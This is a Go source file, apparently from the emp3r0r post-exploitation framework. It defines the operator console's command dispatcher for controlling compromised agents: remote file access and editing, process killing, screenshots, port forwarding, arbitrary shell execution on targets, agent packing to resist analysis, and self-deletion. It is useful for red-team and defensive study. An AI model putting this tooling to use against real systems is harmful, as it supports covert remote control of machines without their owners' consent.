package cc

import (
	"strconv"
	"strings"
	"sync"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// CommandHelp holds all commands and their help string, command: help
var CommandHelp = map[string]string{
	HELP:              "Print this help, 'help <module>' gives help for a module",
	"target":          "Set target. eg. `target <index>`",
	"file_manager":    "Browse remote files in your local file manager with SFTP protocol",
	"set":             "Set an option. eg. `set <option> <val>`",
	"use":             "Use a module. eg. `use <module_name>`",
	"run":             "Run selected module, make sure you have set required options",
	"info":            "What options do we have?",
	"gen_agent":       "Generate agent with provided binary and emp3r0r.json",
	"pack_agent":      "Pack agent to make it smaller and harder to analysis",
	"upgrade_agent":   "Upgrade agent on selected target",
	"ls":              "List current directory of selected agent",
	"mv":              "Move a file to another location on selected target",
	"cp":              "Copy a file to another location on selected target",
	"cd":              "Change current working directory of selected agent",
	"rm":              "Delete a file/directory on selected agent",
	"mkdir":           "Create new directory on selected agent",
	"pwd":             "Current working directory of selected agent",
	"ps":              "Process list of selected agent",
	"kill":            "Terminate a process on selected agent: eg. `kill <pid>`",
	"get":             "Download a file from selected agent",
	"vim":             "Edit a text file on selected agent",
	"put":             "Upload a file to selected agent",
	"screenshot":      "Take a screenshot of selected agent",
	"suicide":         "Kill agent process, delete agent root directory",
	"ls_targets":      "List all targets",
	"ls_modules":      "List all modules",
	"search":          "Search modules",
	"ls_port_fwds":    "List all port mappings",
	"debug":           "Set debug level: -1 (least verbose) to 1 (most verbose)",
	"delete_port_fwd": "Delete a port mapping",
	"exit":            "Exit",
}

// CmdFuncs holds a map of helper functions
var CmdFuncs = map[string]func(){
	"ls_targets":    ListTargets,
	"ls_modules":    ListModules,
	"ls_port_fwds":  ListPortFwds,
	"info":          CliListOptions,
	"run":           ModuleRun,
	"screenshot":    TakeScreenshot,
	"file_manager":  OpenFileManager,
	"upgrade_agent": UpgradeAgent,
	"gen_agent":     GenAgent,
	"pack_agent":    PackAgentBinary,
	"suicide":       Suicide,
}

// CmdFuncsWithArgs commands that accept a single string parameter
var CmdFuncsWithArgs = map[string]func(string){
	"ls":              FSNoArgCmd,
	"pwd":             FSNoArgCmd,
	"cd":              FSSingleArgCmd,
	"mv":              FSDoubleArgCmd,
	"cp":              FSDoubleArgCmd,
	"rm":              FSSingleArgCmd,
	"mkdir":           FSSingleArgCmd,
	"put":             UploadToAgent,
	"get":             DownloadFromAgent,
	"ps":              FSNoArgCmd,
	"kill":            FSSingleArgCmd,
	"delete_port_fwd": DeletePortFwdSession,
	"debug":           setDebugLevel,
	"search":          ModuleSearch,
	"vim":             vimEditFile,
	"set":             setOptVal,
	"label":           setTargetLabel,
	"target":          setCurrentTarget,
}

// CmdTime Record the time spent on each command
var CmdTime = make(map[string]string)
var CmdTimeMutex = &sync.Mutex{}

const HELP = "help" // fuck goconst

// CmdHandler processes user commands
func CmdHandler(cmd string) (err error) {
	cmdSplit := util.ParseCmd(cmd)
	if len(cmdSplit) < 0 {
		return
	}

	switch {
	case cmd == "":
		return
	case cmdSplit[0] == HELP:
		if len(cmdSplit) > 2 {
			CliPrintError("WTF?")
			return
		}
		if len(cmdSplit) == 1 {
			CmdHelp("")
			return
		}
		CmdHelp(cmdSplit[1])

	case cmdSplit[0] == "use":
		if len(cmdSplit) != 2 {
			CliPrintError("use what? " + strconv.Quote(cmd))
			return
		}
		defer SetDynamicPrompt()
		for mod := range ModuleHelpers {
			if mod == cmdSplit[1] {
				CurrentMod = cmdSplit[1]
				for k := range Options {
					delete(Options, k)
				}
				UpdateOptions(CurrentMod)
				CliPrintInfo("Using module %s", strconv.Quote(CurrentMod))
				ModuleDetails(CurrentMod)
				CliListOptions()

				return
			}
		}
		CliPrintError("No such module: %s", strconv.Quote(cmdSplit[1]))

	default:
		helper := CmdFuncs[cmd]
		if helper != nil {
			helper()
			return
		}
		helper_w_arg := CmdFuncsWithArgs[cmdSplit[0]]
		if helper_w_arg == nil && CurrentTarget != nil {
			CliPrintWarning("Exec: %s on %s", strconv.Quote(cmd), strconv.Quote(CurrentTarget.Tag))
			SendCmdToCurrentTarget(cmd, "")
			return
		}
		if CurrentTarget == nil && helper_w_arg == nil {
			CliPrintError("No agent selected, try `target <index>`")
			return
		}
		helper_w_arg(cmd)
	}
	return
}

// CmdHelp prints help in two columns
// print help for modules
func CmdHelp(mod string) {
	help := make(map[string]string)
	if mod == "" {
		CliPrettyPrint("Command", "Help", &CommandHelp)
		return
	}

	for modname, modhelp := range emp3r0r_data.ModuleComments {
		if mod == modname {
			exists := false
			help, exists = emp3r0r_data.ModuleHelp[modname]
			if !exists {
				help = map[string]string{"<N/A>": modhelp}
			}
			CliPrettyPrint("Option", "Help", &help)
			return
		}
	}
	CliPrintError("Help yourself")
}

func vimEditFile(cmd string) {
	cmdSplit := util.ParseCmd(cmd)
	if len(cmdSplit) < 2 {
		CliPrintError("What file to edit?")
		return
	}
	filepath := strings.Join(cmdSplit[1:], " ")
	filename := util.FileBaseName(filepath)

	// tell user what to do
	CliPrintInfo("[*] Now edit %s in vim window",
		filepath)

	// edit remote files
	if GetFile(filepath, CurrentTarget) != nil {
		CliPrintError("Cannot download %s", filepath)
		return
	}

	if err = VimEdit(FileGetDir + filename); err != nil {
		CliPrintError("VimEdit: %v", err)
		return
	} // wait until vim exits

	// upload the new file to target
	if PutFile(FileGetDir+filename, filepath, CurrentTarget) != nil {
		CliPrintError("Cannot upload %s", filepath)
		return
	}
}

func setCurrentTarget(cmd string) {
	cmdSplit := strings.Fields(cmd)
	if len(cmdSplit) != 2 {
		CliPrintError("set target to what? " + strconv.Quote(cmd))
		return
	}
	defer SetDynamicPrompt()
	var target_to_set *emp3r0r_data.AgentSystemInfo

	// select by tag or index
	target_to_set = GetTargetFromTag(strings.Join(cmdSplit[1:], " "))
	if target_to_set == nil {
		index, e := strconv.Atoi(cmdSplit[1])
		if e == nil {
			target_to_set = GetTargetFromIndex(index)
		}
	}

	select_agent := func(a *emp3r0r_data.AgentSystemInfo) {
		CurrentTarget = a
		GetTargetDetails(CurrentTarget)
		CliPrintSuccess("Now targeting %s", CurrentTarget.Tag)
		SetDynamicPrompt()

		// kill shell and sftp window
		if AgentSFTPPane != nil {
			CliPrintInfo("Updating sftp window")
			err = AgentSFTPPane.KillPane()
			if err != nil {
				CliPrintInfo("Updating sftp window: %v", err)
			}
			AgentSFTPPane = nil
		}
		if AgentShellPane != nil {
			CliPrintInfo("Updating shell window")
			err = AgentShellPane.KillPane()
			if err != nil {
				CliPrintInfo("Updating shell window: %v", err)
			}
			AgentShellPane = nil
		}

		// do not open shell automatically in Windows
		if a.GOOS != "windows" {
			CliPrintInfo("Opening Shell window")
			err = SSHClient("bash", "", RuntimeConfig.SSHDPort, true)
			if err != nil {
				CliPrintError("SSHClient: %v", err)
			}
		}
		CliPrintInfo("Opening SFTP window")
		err = SSHClient("sftp", "", RuntimeConfig.SSHDPort, true)
		if err != nil {
			CliPrintError("SFTPClient: %v", err)
		}

		updateAgentExes(target_to_set)
	}

	if target_to_set == nil {
		// if still nothing
		CliPrintError("Target does not exist, no target has been selected")
		return

	} else {
		// lets start the bash shell
		go select_agent(target_to_set)
	}
}

func setTargetLabel(cmd string) {
	cmdSplit := strings.Fields(cmd)
	if len(cmdSplit) < 2 {
		CliPrintError("Invalid command %s, usage: 'label <target tag/index> <label>'", strconv.Quote(cmd))
		return
	}
	index, e := strconv.Atoi(cmdSplit[1])
	label := strings.Join(cmdSplit[2:], " ")

	var target *emp3r0r_data.AgentSystemInfo
	if e != nil {
		target = GetTargetFromTag(cmdSplit[1])
		if target != nil {
			Targets[target].Label = label // set label
			labelAgents()
			CliPrintSuccess("%s has been labeled as %s", target.Tag, label)
		}
		CliPrintError("cannot set target label by index: %v", e)
		return
	}
	target = GetTargetFromIndex(index)
	if target == nil {
		CliPrintError("Target does not exist")
		return
	}
	Targets[target].Label = label // set label
	labelAgents()
	CliPrintSuccess("%s has been labeled as %s", target.Tag, label)
	ListTargets() // update agent list
}

func setOptVal(cmd string) {
	cmdSplit := util.ParseCmd(cmd)
	if len(cmdSplit) < 2 {
		CliPrintError("set what?")
		return
	}
	// hand to SetOption helper
	SetOption(cmdSplit[1:])
	CliListOptions()
}
